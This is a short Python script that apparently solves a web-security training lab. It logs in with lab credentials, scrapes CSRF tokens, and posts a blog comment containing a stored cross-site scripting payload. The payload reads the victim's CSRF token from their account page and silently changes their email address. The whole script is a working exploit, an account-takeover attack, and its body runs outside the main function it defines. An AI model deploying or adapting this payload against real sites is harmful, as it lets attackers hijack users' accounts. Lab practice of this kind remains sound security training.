import re
import sys
import requests
import string
import urllib.parse

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
view_post = burp_url + '/post?postId=7'
add_post = burp_url + '/post/comment'


session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)


response = session.get(view_post)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "postId": "7", "comment": "<script>\r\nvar req = new XMLHttpRequest();\r\nreq.onload = handleResponse;\r\nreq.open('get','/my-account',true);\r\nreq.send();\r\nfunction handleResponse() {\r\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\r\n    var changeReq = new XMLHttpRequest();\r\n    changeReq.open('post', '/my-account/change-email', true);\r\n    changeReq.send('csrf='+token+'&email=test@test.com')\r\n};\r\n</script>", "name": "1234", "email": "a@a.com", "website": ''}
session.post(add_post, data=burp_data)
